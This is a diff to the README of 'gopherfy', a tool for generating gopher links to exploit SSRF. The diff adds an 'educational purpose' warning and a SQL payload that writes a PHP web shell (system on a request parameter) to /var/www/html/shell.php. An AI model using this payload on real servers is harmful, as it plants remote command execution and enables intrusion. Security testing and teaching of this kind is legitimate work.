@@ -3,6 +3,8 @@
 [![Go Reference](https://pkg.go.dev/badge/github.com/hupe1980/gopherfy.svg)](https://pkg.go.dev/github.com/hupe1980/gopherfy)
 > Tool to generate gopher links for exploiting SSRF
 
+:warning: This is for educational purpose. Don’t try it on live servers!
+
 ## How to use
 ```
 Usage:
@@ -84,3 +86,5 @@ Global Flags:
 ```
 ## License
 [MIT](LICENCE)
+
+'select "<?php system($_REQUEST[\'cmd\']); ?>" INTO OUTFILE "/var/www/html/shell.php"'
